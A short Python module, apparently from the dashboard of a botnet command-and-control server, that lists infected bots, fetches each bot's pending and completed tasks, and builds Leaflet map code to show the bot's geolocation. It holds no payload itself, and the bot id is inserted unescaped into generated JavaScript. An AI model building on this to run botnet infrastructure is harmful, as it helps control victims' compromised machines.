from protos.botnet_pb2 import *
from protos.botnet_pb2_grpc import *

def get_bots(client):
    lista = []
    for b in client.GetBots(Empty()):
        lista.append(b)
    total = len(lista)
    return lista, total

def get_bot(client, id):
    tasks = []
    complete = []
    bot = client.GetBot(BotId(bot_id=id))
    for task in client.GetTasksBot(BotId(bot_id=id)):
        tasks.append(task)
    for c in client.GetCompleteBot(BotId(bot_id=id)):
        complete.append(c)
    tasks_n = len(tasks)
    complete_n = len(complete)
    geomap = f'var map = L.map("map").setView([{bot.geo.loc}], 5);'
    geobot = f'L.marker([{bot.geo.loc}]).addTo(map).bindPopup("&#129302 {id}").openPopup();'
    return bot, tasks, complete, tasks_n, complete_n, geomap, geobot